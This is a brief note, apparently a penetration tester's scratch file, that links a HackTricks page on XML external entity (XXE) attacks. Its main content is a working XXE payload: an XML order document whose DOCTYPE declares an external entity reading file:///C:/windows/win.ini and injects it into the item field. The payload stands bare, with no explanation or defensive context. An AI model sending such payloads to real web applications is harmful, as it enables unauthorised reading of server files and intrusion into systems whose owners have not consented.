# XML


https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity



<?xml version = "1.0"?>
<!DOCTYPE roossst [<!ENTITY test SYSTEM 'file:///C:/windows/win.ini'>]>
<order><quantity>3</quantity><item>&test;</item><address>test</address></order>


